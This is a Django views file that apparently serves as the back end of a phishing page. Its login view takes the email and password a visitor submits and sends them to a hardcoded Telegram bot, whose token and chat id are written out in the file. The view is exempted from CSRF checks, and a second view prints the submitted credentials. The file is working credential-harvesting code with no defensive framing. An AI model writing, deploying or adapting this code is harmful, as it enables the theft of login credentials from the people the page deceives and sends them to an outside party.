from django.shortcuts import render,redirect
from django.views.decorators.csrf import csrf_exempt
import requests
from .models import Mail
# Create your views here.

def send_to_telegram(message):
    token = '7584867618:AAHIy5vSZOhoW6Ba0pZdDL0fILznS9RGcyQ'
    chat_id = "7548826388"
    url = f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id}&text={message}"
    res = requests.get(url).json()
    return res

@csrf_exempt
def login_view(request):
    if request.method == 'POST':
        email = request.POST.get("email")
        password = request.POST.get("pass")
        # if email and password:
        #     # Save data to the database
        #     Mail.objects.create(
        #         email=email,
        #         password=password
        #     )
        subject = 'New details submitted'
        mail_message = f"{subject}\nusername: {email}\npassword: {password}"
        send_to_telegram(mail_message)
        print(mail_message)
        
    return render(request, 'index.html')

def success_view(request):
    if request.method == 'POST':
        username = request.POST.get('email')
        password = request.POST.get('pass')
        subject = 'New details submitted'
        mail_message = f"{subject}\nusername: {username}\npassword: {password}"
        print(mail_message)
    return render(request, 'back.html')

